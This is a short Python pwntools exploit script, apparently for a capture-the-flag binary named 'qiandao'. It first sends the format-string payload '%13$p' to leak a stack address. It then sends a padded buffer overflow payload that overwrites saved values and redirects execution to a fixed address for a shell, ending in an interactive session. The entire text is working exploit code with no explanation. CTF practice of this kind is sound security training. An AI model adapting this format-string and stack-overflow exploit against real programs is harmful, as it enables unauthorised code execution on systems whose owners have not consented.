from pwn import *
elf = ELF('./qiandao')
#io = remote('172.17.0.1',10000)
context.log_level = 'debug'

io = process('./qiandao')
sys_addr= 0x0804857D
payload = '%13$p'
io.recvuntil('name:')
io.sendline(payload)
ebp_4 = int(io.recvuntil('C')[:-2],16)
payload2 = 'a'*0x24 + p32(ebp_4)+'a'*0x14 + p32(sys_addr)
io.sendline(payload2)

#pause()
io.interactive()
